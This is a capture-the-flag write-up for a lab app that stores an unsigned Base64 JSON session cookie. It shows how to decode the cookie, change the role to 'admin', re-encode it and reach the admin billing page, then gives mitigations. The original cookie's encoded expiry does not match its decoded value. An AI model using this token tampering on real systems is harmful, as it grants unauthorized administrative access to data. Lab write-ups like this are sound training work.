---
title: "Privilege Escalation – Unsigned Session Token Tampering | Spindrift Workspace"
date: 2026-05-29 00:00:00 +0530
categories: [A01 - Broken Access Control, Privilege Escalation]
tags: [webversepro, broken-access-control, privilege-escalation, session-token, cookie-tampering, base64]
author: Shivansh Sharma
image:
  path: /assets/images/posts/spindrift-workspace-privilege-escalation.webp
  alt: Privilege Escalation – Unsigned Session Token Tampering | Spindrift Workspace
---

## Lab Link

Lab: [Spindrift Workspace](https://dashboard.webverselabs-pro.com/challenges/honor-system)

---

## Overview

Spindrift Workspace is a lightweight project-management SaaS designed for freelance creatives. The application implements a custom session mechanism that stores user information directly inside a browser cookie.

Rather than using a signed or server-validated session, the application trusts the contents of the token supplied by the client.

Because the session token is simply Base64-encoded JSON, an attacker can decode it, modify authorization attributes, re-encode it, and gain elevated privileges.

This results in a privilege escalation vulnerability that grants unauthorized administrative access.

---

## Objective

Manipulate the session token to obtain administrator privileges and retrieve the flag from the billing administration area.

---

## Vulnerability Identification

This challenge is primarily a Privilege Escalation vulnerability.

### Classification Hierarchy

A01 - Broken Access Control
└── Authorization Failure
└── Client-Controlled Authorization
└── Privilege Escalation via Session Token Tampering

---

## Reconnaissance

Navigate to the login page:

```text
https://9d4bd1bf-4065-honor-system-89ac9.challenges.webverselabs-pro.com/login
```

The application provides default credentials.

Login using:

```text
bob@example
bob
```

After authentication, inspect browser cookies using:

* Burp Suite
* Browser Developer Tools
* Proxy History

---

## Exploitation

### Step 1 - Identify the Session Token

After login, the application sets a cookie containing the session data.

Example value:

```text
eyJ1aWQiOjQyLCJlbWFpbCI6ImJvYkBleGFtcGxlIiwicm9sZSI6Im1lbWJlciIsImV4cCI6MTc3OTE3NTk1N30=
```

The structure resembles Base64-encoded data rather than a signed session identifier.

---

### Step 2 - Decode the Cookie

Decode the value using:

```bash
echo 'eyJ1aWQiOjQyLCJlbWFpbCI6ImJvYkBleGFtcGxlIiwicm9sZSI6Im1lbWJlciIsImV4cCI6MTc3OTE3NTk1N30=' | base64 -d
```

Result:

```json
{
  "uid": 42,
  "email": "bob@example",
  "role": "member",
  "exp": 1779175792
}
```

The session token contains the user's role directly inside the client-controlled data.

This immediately suggests the possibility of privilege escalation.

---

### Step 3 - Modify the Role

Change:

```json
"role": "member"
```

to:

```json
"role": "admin"
```

Modified token:

```json
{
  "uid": 42,
  "email": "bob@example",
  "role": "admin",
  "exp": 1779175792
}
```

---

### Step 4 - Re-Encode the Token

Encode the modified JSON back into Base64.

Result:

```text
eyJ1aWQiOjQyLCJlbWFpbCI6ImJvYkBleGFtcGxlIiwicm9sZSI6ImFkbWluIiwiZXhwIjoxNzc5MTc1NzkyfQ==
```

Replace the original cookie value with the modified token.

---

### Step 5 - Refresh the Application

Reload the application.

A new administrator interface becomes available.

This confirms that the server trusts the contents of the client-supplied token without verifying integrity.

---

### Step 6 - Access the Billing Console

Navigate to:

```text
https://9d4bd1bf-4065-honor-system-89ac9.challenges.webverselabs-pro.com/admin/billing
```

The administrative billing page is now accessible.

The flag is displayed within the page.

```text
WEBVERSE{.....}
```

---

## Proof of Exploitation

### Original Token

```json
{
  "uid": 42,
  "email": "bob@example",
  "role": "member",
  "exp": 1779175792
}
```

### Modified Token

```json
{
  "uid": 42,
  "email": "bob@example",
  "role": "admin",
  "exp": 1779175792
}
```

### Modified Cookie

```text
eyJ1aWQiOjQyLCJlbWFpbCI6ImJvYkBleGFtcGxlIiwicm9sZSI6ImFkbWluIiwiZXhwIjoxNzc5MTc1NzkyfQ==
```

### Administrative Endpoint

```text
/admin/billing
```

### Flag

```text
WEBVERSE{.....}
```

---

## Impact

An attacker can:

* Escalate privileges.
* Become an administrator.
* Access privileged functionality.
* View sensitive business data.
* Bypass intended authorization controls.
* Potentially compromise the entire application.

In a real SaaS environment this could expose:

* Customer information
* Billing records
* Internal projects
* Financial data
* Administrative controls

---

## Mitigation

### Never Trust Client-Controlled Roles

Authorization data should not be accepted directly from the browser.

### Use Server-Side Sessions

Store user identity and permissions on the server.

### Sign Session Tokens

If tokens are used, cryptographic signatures must be validated before trusting claims.

Examples include:

```text
JWT with signature validation
Signed cookies
Server-side session identifiers
```

### Validate Roles Server-Side

Administrative access should always be derived from trusted backend data.

### Reject Modified Tokens

Session integrity should be verified on every request.

### Perform Authorization Testing

Review all authentication and session mechanisms for:

```text
role
group
permissions
is_admin
access_level
```

values that can be manipulated by clients.

---

## Real-World Insight

Many applications incorrectly assume that encoding data provides security.

Base64 is not encryption.

Base64 is not signing.

Base64 is not integrity protection.

Attackers routinely decode, modify, and replay client-controlled tokens when applications fail to verify authenticity.

The Spindrift Workspace challenge demonstrates a common authorization failure:

**If the client can modify authorization data and the server never verifies it, the attacker controls their own permissions.**
